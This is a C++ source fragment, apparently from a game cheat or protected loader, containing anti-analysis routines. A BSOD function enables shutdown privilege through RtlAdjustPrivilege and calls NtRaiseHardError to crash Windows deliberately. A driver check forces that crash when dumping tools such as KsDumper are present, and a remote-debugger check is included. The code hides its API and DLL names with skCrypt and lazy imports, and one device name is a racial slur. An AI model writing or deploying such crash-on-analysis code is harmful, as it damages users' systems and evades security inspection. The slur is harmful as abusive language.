#include "game.h"      //edited 
#include "lazy.hpp"   

#include <tlhelp32.h>

#include <iostream>
#include <tlhelp32.h>
#include <fstream>
#include <filesystem>

//self modifying shit
#include <random>
#include <ctime>
#include <thread>
#include <tchar.h>

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void BSOD() {
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA(skCrypt("ntdll.dll")), skCrypt("RtlAdjustPrivilege"));
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandleA(skCrypt("ntdll.dll")), skCrypt("NtRaiseHardError"));
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);

	*((unsigned int*)0) = 0xDEAD;
}

void driverdetect() {
	const TCHAR* devices[] = {
_T("\\\\.\\NiGgEr"),
_T("\\\\.\\KsDumper")
	};

	WORD iLength = sizeof(devices) / sizeof(devices[0]);
	for (int i = 0; i < iLength; i++)
	{
		HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TCHAR msg[256] = _T("");
		if (hFile != INVALID_HANDLE_VALUE) {
			BSOD();
			*((unsigned int*)0) = 0xDEAD;
		}
	}
}

bool HasRemoteDebugger() {
	BOOL remotelyDebugged = FALSE;
	LI_FN(CheckRemoteDebuggerPresent).safe_cached()(LI_FN(GetCurrentProcess).safe_cached()(), &remotelyDebugged);
	return remotelyDebugged;
}